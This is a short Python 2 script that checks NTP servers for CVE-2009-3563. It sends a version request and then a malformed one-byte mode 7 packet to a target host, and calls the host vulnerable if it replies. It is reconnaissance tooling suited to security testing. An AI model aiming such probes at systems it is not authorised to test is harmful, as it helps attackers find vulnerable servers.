#!/usr/bin/env python

import struct
import socket
from socket import *
import binascii
import getopt
import sys

def usage():
        help = "Options:\n"
        help += "\t-h <host>\t target host\n"
        help += "\t-v \t\t Turn on Verbosity\n"
        return help

def main():
        print "ntp error response mode 7 checker"
        print "CVE-2009-3563"
        print "by brad a."
        print "--------------------------------------"
        try:
                opts,args = getopt.getopt(sys.argv[1:], "h:v",[])
        except getopt.GetoptError:
                print usage()
                return

        host = verbose = 0
        port = 123
        for o, a in opts:
                if o == "-h":
                        host = a
                if o == "-v":
                	verbose = 1
        if host == 0:
                print usage()
                return
        print "[+] Targeting",host
        s = socket(AF_INET,SOCK_DGRAM)
        s.settimeout(2)
        #s.bind (('0.0.0.0', 123))
        #msg = "1797000000"
        ver_msg = "160200010000000000000000"

        #s.connect((host,port))

        print "[+] Sending Version Request"

        try:
               s.connect((host,port))
               s.send(binascii.unhexlify(ver_msg))
               recv_data = s.recv(1024)
        except:
               print "[!] Host has timed out or is not responding"
               return

        #recv_data = s.recv(1024)
        print "[+] Client Response:\n\t",recv_data

        recv_data = 0
        msg = "17"

        print "[+] Sending Mode 7 Malformed Packet"
        hex_msg = binascii.unhexlify(msg)
        if verbose == 1:
                print "[+] Sending \t H(", hex_msg, ")\n\t\t A(", binascii.hexlify(hex_msg),")"
        s.send(hex_msg)
        try:
                recv_data = s.recv(1024)
        except:
               print "[+] Response timed out! This most likely means its not vuln"

        print "[+] Client Response:\n\t\t",binascii.hexlify(recv_data)
        s.close()
        if recv_data:
               print "[+] Since we got a response, ima say this guy is vulnerable"
               print "[+] But check the banner for further confirmation some OS's (i.e. juniper/JunOS) are not vuln"
               print "[+] ntpd < 4.2.4p8 and 4.2.5 are vuln"
        else:
               print "[+] No response! guess its not vuln"



main()

